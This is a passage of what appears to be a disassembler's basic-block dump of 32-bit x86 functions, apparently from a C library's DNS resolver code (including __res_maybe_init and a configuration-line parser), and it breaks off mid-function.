0xb10b8f9:	mov	eax, dword ptr [esp + 0x20]
0xb10b8fd:	mov	dword ptr [esp + 8], esi
0xb10b901:	mov	dword ptr [esp + 4], 0x891b
0xb10b909:	mov	dword ptr [esp], eax
0xb10b90c:	call	0xb0e30e0
None
|
|
|
v
0xb10b921:	mov	ecx, dword ptr [ebp + ecx + 4]
0xb10b925:	add	edx, 0xc
0xb10b928:	mov	eax, dword ptr [esp + 0x2c]
0xb10b92c:	mov	ebp, dword ptr [ebx + 0xf80]
0xb10b932:	add	dword ptr [esp + 0x10], 1
0xb10b937:	mov	dword ptr [ebp + eax + 8], ecx
0xb10b93b:	mov	eax, ebp
0xb10b93d:	jmp	0xb10b8b0
None
|
|
|
v
0xb10b8c0:	mov	edx, dword ptr [esp + 0x10]
0xb10b8c4:	lea	edx, dword ptr [edx + edx*2]
0xb10b8c7:	shl	edx, 2
0xb10b8ca:	cmp	word ptr [esi + 0x10], 2
0xb10b8cf:	jne	0xb10b8b0
None
|
|
|
v
0xb10b79a:	jmp	0xb10b708
None
|
|
|
v
0xb10b708:	add	esp, 0x4c
0xb10b70b:	pop	ebx
0xb10b70c:	pop	esi
0xb10b70d:	pop	edi
0xb10b70e:	pop	ebp
0xb10b70f:	ret	
None
|
|
|
v
0xb10b777:	add	eax, 1
0xb10b77a:	cmp	eax, edi
0xb10b77c:	jne	0xb10b768
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10ba00
TOTAL BLOCKS :11
0xb10ba73:	add	esp, 0x1c
0xb10ba76:	pop	ebx
0xb10ba77:	pop	esi
0xb10ba78:	pop	edi
0xb10ba79:	pop	ebp
0xb10ba7a:	ret	
None
|
|
|
v
0xb10ba66:	test	eax, eax
0xb10ba68:	je	0xb10ba80
None
|
|
|
v
0xb10ba38:	mov	eax, dword ptr [ebx - 0xfc]
0xb10ba3e:	mov	esi, dword ptr [eax + edi*4 + 0x1c]
0xb10ba42:	mov	dword ptr [esp], esi
0xb10ba45:	call	0xb07ae80
None
|
|
|
v
0xb10ba1e:	mov	dword ptr [esp + 8], eax
0xb10ba22:	mov	eax, dword ptr [ebx - 0xfc]
0xb10ba28:	mov	eax, dword ptr [eax + 0x18]
0xb10ba2b:	test	eax, eax
0xb10ba2d:	mov	dword ptr [esp + 0xc], eax
0xb10ba31:	jle	0xb10ba73
None
|
|
|
v
0xb10ba50:	mov	ebp, dword ptr [esp + 8]
0xb10ba54:	mov	dword ptr [esp + 4], esi
0xb10ba58:	sub	ebp, eax
0xb10ba5a:	add	ebp, dword ptr [esp + 0x30]
0xb10ba5e:	mov	dword ptr [esp], ebp
0xb10ba61:	call	0xb094ec0
None
|
|
|
v
0xb10ba4a:	cmp	dword ptr [esp + 8], eax
0xb10ba4e:	jbe	0xb10ba6a
None
|
|
|
v
0xb10ba00:	push	ebp
0xb10ba01:	push	edi
0xb10ba02:	push	esi
0xb10ba03:	push	ebx
0xb10ba04:	sub	esp, 0x1c
0xb10ba07:	call	0xb1267db
None
|
|
|
v
0xb10ba0c:	add	ebx, 0x9f5f4
0xb10ba12:	mov	eax, dword ptr [esp + 0x30]
0xb10ba16:	mov	dword ptr [esp], eax
0xb10ba19:	call	0xb07ae80
None
|
|
|
v
0xb10ba33:	xor	edi, edi
0xb10ba35:	lea	esi, dword ptr [esi]
0xb10ba38:	mov	eax, dword ptr [ebx - 0xfc]
0xb10ba3e:	mov	esi, dword ptr [eax + edi*4 + 0x1c]
0xb10ba42:	mov	dword ptr [esp], esi
0xb10ba45:	call	0xb07ae80
None
|
|
|
v
0xb10ba80:	mov	byte ptr [ebp], 0
0xb10ba84:	add	esp, 0x1c
0xb10ba87:	pop	ebx
0xb10ba88:	pop	esi
0xb10ba89:	pop	edi
0xb10ba8a:	pop	ebp
0xb10ba8b:	ret	
None
|
|
|
v
0xb10ba6a:	add	edi, 1
0xb10ba6d:	cmp	edi, dword ptr [esp + 0xc]
0xb10ba71:	jne	0xb10ba38
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10ba90
TOTAL BLOCKS :9
0xb10bad8:	mov	dword ptr [esp], eax
0xb10badb:	call	0xb10ba00
None
|
|
|
v
0xb10ba90:	push	edi
0xb10ba91:	push	esi
0xb10ba92:	push	ebx
0xb10ba93:	call	0xb1267db
None
|
|
|
v
0xb10bae0:	mov	eax, dword ptr [edi + 4]
0xb10bae3:	mov	eax, dword ptr [eax + esi]
0xb10bae6:	add	esi, 4
0xb10bae9:	test	eax, eax
0xb10baeb:	jne	0xb10bad8
None
|
|
|
v
0xb10ba98:	add	ebx, 0x9f568
0xb10ba9e:	sub	esp, 0x10
0xb10baa1:	mov	edi, dword ptr [esp + 0x20]
0xb10baa5:	mov	eax, dword ptr [ebx - 0xfc]
0xb10baab:	mov	eax, dword ptr [eax + 0x18]
0xb10baae:	test	eax, eax
0xb10bab0:	jne	0xb10bac0
None
|
|
|
v
0xb10bab2:	add	esp, 0x10
0xb10bab5:	pop	ebx
0xb10bab6:	pop	esi
0xb10bab7:	pop	edi
0xb10bab8:	ret	
None
|
|
|
v
0xb10baed:	add	esp, 0x10
0xb10baf0:	pop	ebx
0xb10baf1:	pop	esi
0xb10baf2:	pop	edi
0xb10baf3:	ret	
None
|
|
|
v
0xb10bac0:	mov	eax, dword ptr [edi]
0xb10bac2:	mov	dword ptr [esp], eax
0xb10bac5:	call	0xb10ba00
None
|
|
|
v
0xb10bad3:	mov	esi, 4
0xb10bad8:	mov	dword ptr [esp], eax
0xb10badb:	call	0xb10ba00
None
|
|
|
v
0xb10baca:	mov	eax, dword ptr [edi + 4]
0xb10bacd:	mov	eax, dword ptr [eax]
0xb10bacf:	test	eax, eax
0xb10bad1:	je	0xb10bab2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__res_maybe_init
TOTAL BLOCKS :32
0xb10bdaa:	jmp	0xb10bd0b
None
|
|
|
v
0xb10bc3e:	mov	ecx, dword ptr [esp + 0x84]
0xb10bc45:	test	ecx, ecx
0xb10bc47:	je	0xb10bd48
None
|
|
|
v
0xb10bcfd:	lock sub	dword ptr [ebx + 0x31c4], 1
None
|
|
|
v
0xb10bd05:	jne	0xb10bd9f
None
|
|
|
v
0xb10bcc1:	lock cmpxchg	dword ptr [ebx + 0x31c4], ecx
0xb10bcc9:	jne	0xb10bd8f
None
|
|
|
v
0xb10bd0b:	mov	eax, dword ptr [esi + 0x1f0]
0xb10bd11:	mov	edx, dword ptr [esi + 0x1f4]
0xb10bd17:	xor	edx, dword ptr [ebx + 0x38ec]
0xb10bd1d:	xor	eax, dword ptr [ebx + 0x38e8]
0xb10bd23:	or	edx, eax
0xb10bd25:	je	0xb10bd68
None
|
|
|
v
0xb10bc59:	mov	eax, dword ptr [esi + 4]
0xb10bc5c:	test	eax, eax
0xb10bc5e:	jne	0xb10bc67
None
|
|
|
v
0xb10bc4d:	mov	edx, dword ptr [esi]
0xb10bc4f:	test	edx, edx
0xb10bc51:	jne	0xb10bc59
None
|
|
|
v
0xb10bc53:	mov	dword ptr [esi], 5
0xb10bc59:	mov	eax, dword ptr [esi + 4]
0xb10bc5c:	test	eax, eax
0xb10bc5e:	jne	0xb10bc67
None
|
|
|
v
0xb10bcf3:	cmp	dword ptr gs:[0xc], 0
0xb10bcfb:	je	0xb10bcfe
None
|
|
|
v
0xb10bd42:	jmp	0xb10bc79
None
|
|
|
v
0xb10bc60:	mov	dword ptr [esi + 4], 4
0xb10bc67:	cmp	word ptr [esi + 0x40], 0
0xb10bc6c:	mov	dword ptr [esi + 8], 0x802c0
0xb10bc73:	je	0xb10bd58
None
|
|
|
v
0xb10bc67:	cmp	word ptr [esi + 0x40], 0
0xb10bc6c:	mov	dword ptr [esi + 8], 0x802c0
0xb10bc73:	je	0xb10bd58
None
|
|
|
v
0xb10bd8f:	lea	ecx, dword ptr [ebx + 0x31c4]
0xb10bd95:	call	0xb0f9430
None
|
|
|
v
0xb10bd48:	mov	dword ptr [esp], esi
0xb10bd4b:	call	0xb10ad90
None
|
|
|
v
0xb10bcd3:	mov	eax, dword ptr [esp + 0x58]
0xb10bcd7:	cmp	eax, dword ptr [ebx + 0x31c0]
0xb10bcdd:	je	0xb10bcf3
None
|
|
|
v
0xb10bd68:	xor	eax, eax
0xb10bd6a:	jmp	0xb10bc89
None
|
|
|
v
0xb10bd5d:	mov	word ptr [esi + 0x40], ax
0xb10bd61:	jmp	0xb10bc79
None
|
|
|
v
0xb10bd27:	mov	edi, dword ptr [esi + 0xc]
0xb10bd2a:	test	edi, edi
0xb10bd2c:	jle	0xb10bc79
None
|
|
|
v
0xb10bc89:	add	esp, 0x70
0xb10bc8c:	pop	ebx
0xb10bc8d:	pop	esi
0xb10bc8e:	pop	edi
0xb10bc8f:	ret	
None
|
|
|
v
0xb10bd9f:	lea	eax, dword ptr [ebx + 0x31c4]
0xb10bda5:	call	0xb0f9460
None
|
|
|
v
0xb10bc32:	add	ebx, 0x9f3ce
0xb10bc38:	test	byte ptr [esi + 8], 1
0xb10bc3c:	jne	0xb10bc90
None
|
|
|
v
0xb10bc90:	lea	eax, dword ptr [esp + 0x18]
0xb10bc94:	mov	dword ptr [esp + 8], eax
0xb10bc98:	lea	eax, dword ptr [ebx - 0x475ba]
0xb10bc9e:	mov	dword ptr [esp + 4], eax
0xb10bca2:	mov	dword ptr [esp], 3
0xb10bca9:	call	0xb0da090
None
|
|
|
v
0xb10bd32:	mov	dword ptr [esp + 4], 1
0xb10bd3a:	mov	dword ptr [esp], esi
0xb10bd3d:	call	0xb10add0
None
|
|
|
v
0xb10bcdf:	add	dword ptr [ebx + 0x38e8], 1
0xb10bce6:	adc	dword ptr [ebx + 0x38ec], 0
0xb10bced:	mov	dword ptr [ebx + 0x31c0], eax
0xb10bcf3:	cmp	dword ptr gs:[0xc], 0
0xb10bcfb:	je	0xb10bcfe
None
|
|
|
v
0xb10bd50:	add	esp, 0x70
0xb10bd53:	pop	ebx
0xb10bd54:	pop	esi
0xb10bd55:	pop	edi
0xb10bd56:	ret	
None
|
|
|
v
0xb10bc79:	mov	dword ptr [esp + 4], 1
0xb10bc81:	mov	dword ptr [esp], esi
0xb10bc84:	call	0xb10a230
None
|
|
|
v
0xb10bcae:	mov	ecx, 1
0xb10bcb3:	mov	edi, eax
0xb10bcb5:	xor	eax, eax
0xb10bcb7:	cmp	dword ptr gs:[0xc], 0
0xb10bcbf:	je	0xb10bcc2
None
|
|
|
v
0xb10bd58:	call	0xb10adc0
None
|
|
|
v
0xb10bc20:	push	edi
0xb10bc21:	push	esi
0xb10bc22:	push	ebx
0xb10bc23:	sub	esp, 0x70
0xb10bc26:	mov	esi, dword ptr [esp + 0x80]
0xb10bc2d:	call	0xb1267db
None
|
|
|
v
0xb10bd9a:	jmp	0xb10bccf
None
|
|
|
v
0xb10bccf:	test	edi, edi
0xb10bcd1:	jne	0xb10bcf3
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10bea0
TOTAL BLOCKS :76
0xb10bfdc:	mov	eax, dword ptr [esp + 0xc]
0xb10bfe0:	mov	ecx, dword ptr [esp + 0x14]
0xb10bfe4:	mov	dword ptr [esp + 0x14], eax
0xb10bfe8:	mov	dword ptr [ecx], eax
0xb10bfea:	movzx	eax, byte ptr [edi]
0xb10bfed:	movsx	edx, al
0xb10bff0:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10bff5:	je	0xb10bef9
None
|
|
|
v
0xb10c1e8:	mov	eax, dword ptr [esp + 0x20]
0xb10c1ec:	mov	dword ptr [esp + 8], 8
0xb10c1f4:	mov	dword ptr [esp], edi
0xb10c1f7:	mov	dword ptr [esp + 4], eax
0xb10c1fb:	call	0xb017430
None
|
|
|
v
0xb10c0b1:	cmp	eax, 8
0xb10c0b4:	jne	0xb10c218
None
|
|
|
v
0xb10c047:	xor	ecx, ecx
0xb10c049:	cmp	al, 0x21
0xb10c04b:	sete	cl
0xb10c04e:	mov	dword ptr [esp + 0x10], ecx
0xb10c052:	jne	0xb10c05b
None
|
|
|
v
0xb10bf30:	cmp	edi, esi
0xb10bf32:	je	0xb10c224
None
|
|
|
v
0xb10c092:	cmp	al, 0x3d
0xb10c094:	je	0xb10c0a4
None
|
|
|
v
0xb10c088:	movsx	edx, al
0xb10c08b:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10c090:	jne	0xb10c0a4
None
|
|
|
v
0xb10c100:	add	esi, 1
0xb10c103:	movzx	eax, byte ptr [esi]
0xb10c106:	movsx	edx, al
0xb10c109:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10c10e:	jne	0xb10c100
None
|
|
|
v
0xb10c159:	cmp	eax, 8
0xb10c15c:	mov	edi, esi
0xb10c15e:	jne	0xb10c218
None
|
|
|
v
0xb10c0e8:	add	esi, 1
0xb10c0eb:	movzx	eax, byte ptr [esi]
0xb10c0ee:	movsx	edx, al
0xb10c0f1:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10c0f6:	jne	0xb10c0e8
None
|
|
|
v
0xb10c2b0:	mov	dword ptr [esp + 0x18], 1
0xb10c2b8:	jmp	0xb10c0eb
None
|
|
|
v
0xb10bf22:	cmp	al, 0x5b
0xb10bf24:	je	0xb10bf30
None
|
|
|
v
0xb10c17e:	test	eax, eax
0xb10c180:	jne	0xb10c218
None
|
|
|
v
0xb10c09a:	add	esi, 1
0xb10c09d:	movzx	eax, byte ptr [esi]
0xb10c0a0:	test	al, al
0xb10c0a2:	jne	0xb10c088
None
|
|
|
v
0xb10c1b3:	movzx	eax, byte ptr [esi]
0xb10c1b6:	movsx	ecx, al
0xb10c1b9:	test	byte ptr [ebp + ecx*2 + 1], 0x20
0xb10c1be:	je	0xb10c1d0
None
|
|
|
v
0xb10c0ba:	mov	eax, dword ptr [esp + 0x1c]
0xb10c0be:	mov	dword ptr [esp + 8], 8
0xb10c0c6:	mov	dword ptr [esp], edi
0xb10c0c9:	mov	dword ptr [esp + 4], eax
0xb10c0cd:	call	0xb017430
None
|
|
|
v
0xb10c110:	test	al, al
0xb10c112:	mov	ecx, esi
0xb10c114:	je	0xb10c218
None
|
|
|
v
0xb10c1d0:	cmp	al, 0x5d
0xb10c1d2:	je	0xb10c2a8
None
|
|
|
v
0xb10c008:	movsx	edx, al
0xb10c00b:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10c010:	je	0xb10c01c
None
|
|
|
v
0xb10c122:	cmp	al, 0x5d
0xb10c124:	jne	0xb10c142
None
|
|
|
v
0xb10c204:	mov	dword ptr [esp + 0x18], 0xfffffffe
0xb10c20c:	jmp	0xb10c0eb
None
|
|
|
v
0xb10c11a:	cmp	al, 0x3d
0xb10c11c:	je	0xb10c218
None
|
|
|
v
0xb10c224:	mov	eax, dword ptr [esp + 0x3c]
0xb10c228:	add	esp, 0x4c
0xb10c22b:	pop	ebx
0xb10c22c:	pop	esi
0xb10c22d:	pop	edi
0xb10c22e:	pop	ebp
0xb10c22f:	ret	
None
|
|
|
v
0xb10c071:	cmp	al, 0x3d
0xb10c073:	je	0xb10c218
None
|
|
|
v
0xb10bf5b:	mov	ecx, dword ptr [esp + 0xc]
0xb10bf5f:	mov	eax, ecx
0xb10bf61:	add	eax, 0x24
0xb10bf64:	mov	dword ptr [ecx + 0x20], eax
0xb10bf67:	mov	dword ptr [esp + 8], edx
0xb10bf6b:	mov	dword ptr [esp + 4], edi
0xb10bf6f:	mov	edi, esi
0xb10bf71:	mov	dword ptr [esp], eax
0xb10bf74:	call	0xb07cad0
None
|
|
|
v
0xb10c0da:	mov	dword ptr [esp + 0x18], 0
0xb10c0e2:	jmp	0xb10c0eb
None
|
|
|
v
0xb10bee8:	movzx	eax, byte ptr [edi]
0xb10beeb:	movsx	edx, al
0xb10beee:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10bef3:	jne	0xb10bffb
None
|
|
|
v
0xb10c278:	lea	eax, dword ptr [ebx - 0x4748d]
0xb10c27e:	mov	dword ptr [esp + 8], 6
0xb10c286:	mov	dword ptr [esp + 4], eax
0xb10c28a:	mov	dword ptr [esp], ecx
0xb10c28d:	call	0xb017430
None
|
|
|
v
0xb10c054:	movzx	eax, byte ptr [edi + 1]
0xb10c058:	add	edi, 1
0xb10c05b:	test	al, al
0xb10c05d:	je	0xb10c218
None
|
|
|
v
0xb10c230:	mov	eax, dword ptr [esp + 0x24]
0xb10c234:	mov	dword ptr [esp + 8], 7
0xb10c23c:	mov	dword ptr [esp], edi
0xb10c23f:	mov	dword ptr [esp + 4], eax
0xb10c243:	call	0xb017430
None
|
|
|
v
0xb10c186:	cmp	dword ptr [esp + 0x10], 0
0xb10c18b:	mov	ecx, dword ptr [esp + 0xc]
0xb10c18f:	mov	edx, dword ptr [esp + 0x18]
0xb10c193:	je	0xb10c1e0
None
|
|
|
v
0xb10bf18:	movsx	edx, al
0xb10bf1b:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10bf20:	jne	0xb10bf30
None
|
|
|
v
0xb10c1e0:	mov	dword ptr [ecx + edx*4 + 0xc], eax
0xb10c1e4:	jmp	0xb10c1b3
None
|
|
|
v
0xb10c01c:	mov	ecx, dword ptr [esp + 0x28]
0xb10c020:	mov	esi, dword ptr [ebx - 0x110]
0xb10c026:	mov	ebp, dword ptr [ecx + esi]
0xb10c029:	lea	ecx, dword ptr [ebx - 0x47496]
0xb10c02f:	mov	dword ptr [esp + 0x20], ecx
0xb10c033:	lea	ecx, dword ptr [ebx - 0x474af]
0xb10c039:	mov	dword ptr [esp + 0x24], ecx
0xb10c03d:	lea	ecx, dword ptr [ebx - 0x474a7]
0xb10c043:	mov	dword ptr [esp + 0x2c], ecx
0xb10c047:	xor	ecx, ecx
0xb10c049:	cmp	al, 0x21
0xb10c04b:	sete	cl
0xb10c04e:	mov	dword ptr [esp + 0x10], ecx
0xb10c052:	jne	0xb10c05b
None
|
|
|
v
0xb10bf4b:	mov	edx, dword ptr [esp + 0x10]
0xb10bf4f:	test	eax, eax
0xb10bf51:	mov	dword ptr [esp + 0xc], eax
0xb10bf55:	je	0xb10c224
None
|
|
|
v
0xb10c264:	test	eax, eax
0xb10c266:	jne	0xb10c218
None
|
|
|
v
0xb10c2a8:	add	edi, 1
0xb10c2ab:	jmp	0xb10bfdc
None
|
|
|
v
0xb10c130:	movsx	edx, al
0xb10c133:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10c138:	jne	0xb10c14c
None
|
|
|
v
0xb10c164:	lea	eax, dword ptr [ebx - 0x47486]
0xb10c16a:	mov	dword ptr [esp + 8], 8
0xb10c172:	mov	dword ptr [esp + 4], eax
0xb10c176:	mov	dword ptr [esp], ecx
0xb10c179:	call	0xb017430
None
|
|
|
v
0xb10bf26:	add	esi, 1
0xb10bf29:	movzx	eax, byte ptr [esi]
0xb10bf2c:	test	al, al
0xb10bf2e:	jne	0xb10bf18
None
|
|
|
v
0xb10bf38:	mov	edx, esi
0xb10bf3a:	sub	edx, edi
0xb10bf3c:	lea	eax, dword ptr [edx + 0x25]
0xb10bf3f:	mov	dword ptr [esp], eax
0xb10bf42:	mov	dword ptr [esp + 0x10], edx
0xb10bf46:	call	0xb0173f0
None
|
|
|
v
0xb10c081:	mov	esi, edi
0xb10c083:	jmp	0xb10c09a
None
|
|
|
v
0xb10bfd8:	cmp	al, 0x5b
0xb10bfda:	je	0xb10c012
None
|
|
|
v
0xb10bea0:	push	ebp
0xb10bea1:	mov	ecx, eax
0xb10bea3:	mov	eax, dword ptr gs:[0]
0xb10bea9:	push	edi
0xb10beaa:	push	esi
0xb10beab:	push	ebx
0xb10beac:	call	0xb1267db
None
|
|
|
v
0xb10c05b:	test	al, al
0xb10c05d:	je	0xb10c218
None
|
|
|
v
0xb10c0f8:	cmp	al, 0x3d
0xb10c0fa:	jne	0xb10c218
None
|
|
|
v
0xb10c296:	mov	edi, esi
0xb10c298:	mov	eax, 1
0xb10c29d:	jmp	0xb10c186
None
|
|
|
v
0xb10c292:	test	eax, eax
0xb10c294:	jne	0xb10c218
None
|
|
|
v
0xb10c13e:	cmp	al, 0x5d
0xb10c140:	je	0xb10c14c
None
|
|
|
v
0xb10bffb:	add	edi, 1
0xb10bffe:	jmp	0xb10bee8
None
|
|
|
v
0xb10c0d2:	test	eax, eax
0xb10c0d4:	jne	0xb10c1e8
None
|
|
|
v
0xb10c142:	add	esi, 1
0xb10c145:	movzx	eax, byte ptr [esi]
0xb10c148:	test	al, al
0xb10c14a:	jne	0xb10c130
None
|
|
|
v
0xb10c079:	cmp	al, 0x5d
0xb10c07b:	je	0xb10c218
None
|
|
|
v
0xb10c012:	add	edi, 1
0xb10c015:	movzx	eax, byte ptr [edi]
0xb10c018:	test	al, al
0xb10c01a:	jne	0xb10c008
None
|
|
|
v
0xb10c0a4:	mov	eax, esi
0xb10c0a6:	sub	eax, edi
0xb10c0a8:	cmp	eax, 7
0xb10c0ab:	je	0xb10c230
None
|
|
|
v
0xb10beb1:	add	ebx, 0x9f14f
0xb10beb7:	sub	esp, 0x4c
0xb10beba:	mov	dword ptr [esp + 0x28], eax
0xb10bebe:	mov	dword ptr [esp + 0x3c], 0
0xb10bec6:	mov	edi, dword ptr [ebx - 0x110]
0xb10becc:	mov	edi, dword ptr [eax + edi]
0xb10becf:	lea	eax, dword ptr [esp + 0x3c]
0xb10bed3:	mov	dword ptr [esp + 0x14], eax
0xb10bed7:	lea	eax, dword ptr [ebx - 0x4749f]
0xb10bedd:	mov	dword ptr [esp + 0x1c], eax
0xb10bee1:	mov	ebp, edi
0xb10bee3:	mov	edi, ecx
0xb10bee5:	lea	esi, dword ptr [esi]
0xb10bee8:	movzx	eax, byte ptr [edi]
0xb10beeb:	movsx	edx, al
0xb10beee:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10bef3:	jne	0xb10bffb
None
|
|
|
v
0xb10bf79:	mov	ecx, dword ptr [esp + 0xc]
0xb10bf7d:	mov	byte ptr [eax], 0
0xb10bf80:	mov	dword ptr [ecx + 0x1c], 0
0xb10bf87:	mov	dword ptr [ecx + 4], 0
0xb10bf8e:	mov	dword ptr [ecx + 8], 0
0xb10bf95:	mov	dword ptr [ecx + 0xc], 0
0xb10bf9c:	mov	dword ptr [ecx + 0x10], 1
0xb10bfa3:	mov	dword ptr [ecx + 0x14], 1
0xb10bfaa:	mov	dword ptr [ecx + 0x18], 0
0xb10bfb1:	mov	dword ptr [ecx], 0
0xb10bfb7:	movzx	eax, byte ptr [esi]
0xb10bfba:	movsx	edx, al
0xb10bfbd:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10bfc2:	je	0xb10bfd8
None
|
|
|
v
0xb10c268:	mov	dword ptr [esp + 0x18], 0xffffffff
0xb10c270:	jmp	0xb10c0eb
None
|
|
|
v
0xb10c248:	test	eax, eax
0xb10c24a:	je	0xb10c2b0
None
|
|
|
v
0xb10c096:	cmp	al, 0x5d
0xb10c098:	je	0xb10c0a4
None
|
|
|
v
0xb10c14c:	mov	eax, esi
0xb10c14e:	sub	eax, ecx
0xb10c150:	cmp	eax, 6
0xb10c153:	je	0xb10c278
None
|
|
|
v
0xb10c200:	test	eax, eax
0xb10c202:	jne	0xb10c218
None
|
|
|
v
0xb10c1d8:	movzx	eax, byte ptr [edi]
0xb10c1db:	jmp	0xb10c047
None
|
|
|
v
0xb10bfc4:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb10bf09:	mov	esi, edi
0xb10bf0b:	nop	
0xb10bf0c:	lea	esi, dword ptr [esi]
0xb10bf10:	jmp	0xb10bf26
None
|
|
|
v
0xb10c24c:	mov	eax, dword ptr [esp + 0x2c]
0xb10c250:	mov	dword ptr [esp + 8], 7
0xb10c258:	mov	dword ptr [esp], edi
0xb10c25b:	mov	dword ptr [esp + 4], eax
0xb10c25f:	call	0xb017430
None
|
|
|
v
0xb10bf01:	cmp	al, 0x5b
0xb10bf03:	je	0xb10c224
None
|
|
|
v
0xb10c1c0:	add	edi, 1
0xb10c1c3:	movzx	eax, byte ptr [edi]
0xb10c1c6:	movsx	edx, al
0xb10c1c9:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10c1ce:	jne	0xb10c1c0
None
|
|
|
v
0xb10c126:	jmp	0xb10c218
None
|
|
|
v
0xb10c218:	mov	ebp, dword ptr [esp + 0xc]
0xb10c21c:	mov	dword ptr [esp], ebp
0xb10c21f:	call	0xb017470
None
|
|
|
v
0xb10c0eb:	movzx	eax, byte ptr [esi]
0xb10c0ee:	movsx	edx, al
0xb10c0f1:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10c0f6:	jne	0xb10c0e8
None
|
|
|
v
0xb10bef9:	test	al, al
0xb10befb:	je	0xb10c224
None
|
|
|
v
0xb10bfc8:	add	edi, 1
0xb10bfcb:	movzx	eax, byte ptr [edi]
0xb10bfce:	movsx	edx, al
0xb10bfd1:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb10bfd6:	jne	0xb10bfc8
None
|
|
|
v
0xb10c13a:	cmp	al, 0x3d
0xb10c13c:	je	0xb10c14c
None
|
|
|
v
0xb10c063:	movsx	ecx, al
0xb10c066:	test	byte ptr [ebp + ecx*2 + 1], 0x20
0xb10c06b:	jne	0xb10c218
None
|
|
|
v
0xb10c195:	lea	edx, dword ptr [ecx + edx*4 + 8]
0xb10c199:	mov	dword ptr [esp + 0x10], edx
0xb10c19d:	mov	edx, dword ptr [edx + 4]
0xb10c1a0:	mov	dword ptr [ecx + 4], eax
0xb10c1a3:	mov	dword ptr [ecx + 8], eax
0xb10c1a6:	mov	dword ptr [ecx + 0xc], eax
0xb10c1a9:	mov	dword ptr [ecx + 0x10], eax
0xb10c1ac:	mov	eax, dword ptr [esp + 0x10]
0xb10c1b0:	mov	dword ptr [eax + 4], edx
0xb10c1b3:	movzx	eax, byte ptr [esi]
0xb10c1b6:	movsx	ecx, al
0xb10c1b9:	test	byte ptr [ebp + ecx*2 + 1], 0x20
0xb10c1be:	je	0xb10c1d0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10c340
TOTAL BLOCKS :37
0xb10c352:	add	ebx, 0x9ecae
0xb10c358:	mov	dword ptr [ebp - 0x1c], edx
0xb10c35b:	test	edi, edi
0xb10c35d:	je	0xb10c370
None
|
|
|
v
0xb10c478:	mov	esi, dword ptr [ebp - 0x24]
0xb10c47b:	add	edi, 8
0xb10c47e:	mov	dword ptr [esp], 0xc
0xb10c485:	call	0xb0173f0
None
|
|
|
v
0xb10c5be:	mov	edx, dword ptr [esi]
0xb10c5c0:	mov	dword ptr [ebp - 0x1c], edx
0xb10c5c3:	mov	dword ptr [esp + 4], 0x80000001
0xb10c5cb:	mov	dword ptr [esp], edi
0xb10c5ce:	call	0xb123ae0
None
|
|
|
v
0xb10c3ad:	mov	dword ptr [esp + 4], esi
0xb10c3b1:	mov	eax, dword ptr [edi]
0xb10c3b3:	mov	dword ptr [esp], eax
0xb10c3b6:	call	0xb07a740
None
|
|
|
v
0xb10c340:	push	ebp
0xb10c341:	mov	ebp, esp
0xb10c343:	push	edi
0xb10c344:	push	esi
0xb10c345:	mov	esi, eax
0xb10c347:	push	ebx
0xb10c348:	sub	esp, 0x3c
0xb10c34b:	mov	edi, dword ptr [eax]
0xb10c34d:	call	0xb1267db
None
|
|
|
v
0xb10c58e:	mov	eax, dword ptr [esi]
0xb10c590:	mov	ecx, dword ptr [eax + 4]
0xb10c593:	test	ecx, ecx
0xb10c595:	jne	0xb10c46a
None
|
|
|
v
0xb10c5b6:	lea	edi, dword ptr [eax + 4]
0xb10c5b9:	jmp	0xb10c47e
None
|
|
|
v
0xb10c4c8:	mov	eax, dword ptr [ebp - 0x1c]
0xb10c4cb:	mov	dword ptr [ebp - 0x24], esp
0xb10c4ce:	mov	ecx, dword ptr [eax]
0xb10c4d0:	mov	dword ptr [esp], ecx
0xb10c4d3:	mov	dword ptr [ebp - 0x1c], ecx
0xb10c4d6:	call	0xb07ae80
None
|
|
|
v
0xb10c3bf:	mov	esi, dword ptr [ebp - 0x24]
0xb10c3c2:	mov	dword ptr [esi], edi
0xb10c3c4:	jmp	0xb10c35f
None
|
|
|
v
0xb10c3ab:	mov	edi, eax
0xb10c3ad:	mov	dword ptr [esp + 4], esi
0xb10c3b1:	mov	eax, dword ptr [edi]
0xb10c3b3:	mov	dword ptr [esp], eax
0xb10c3b6:	call	0xb07a740
None
|
|
|
v
0xb10c426:	mov	edx, 0x322e
0xb10c42b:	mov	dword ptr [eax], 0x6f732e
0xb10c431:	mov	byte ptr [eax + 5], 0
0xb10c435:	mov	word ptr [eax + 3], dx
0xb10c439:	mov	edx, dword ptr [esi]
0xb10c43b:	mov	dword ptr [ebp - 0x24], edx
0xb10c43e:	mov	dword ptr [esp + 4], 0x80000001
0xb10c446:	mov	dword ptr [esp], edi
0xb10c449:	call	0xb123ae0
None
|
|
|
v
0xb10c494:	mov	ecx, dword ptr [ebp - 0x20]
0xb10c497:	mov	dword ptr [eax], ecx
0xb10c499:	mov	eax, dword ptr [edi]
0xb10c49b:	mov	dword ptr [eax + 4], 0
0xb10c4a2:	mov	eax, dword ptr [edi]
0xb10c4a4:	mov	dword ptr [eax + 8], 0
0xb10c4ab:	mov	edi, dword ptr [edi]
0xb10c4ad:	test	edi, edi
0xb10c4af:	mov	dword ptr [esi], edi
0xb10c4b1:	jne	0xb10c35f
None
|
|
|
v
0xb10c4db:	mov	ecx, 0x10
0xb10c4e0:	xor	edx, edx
0xb10c4e2:	add	eax, 0x1a
0xb10c4e5:	div	ecx
0xb10c4e7:	mov	ecx, dword ptr [ebp - 0x1c]
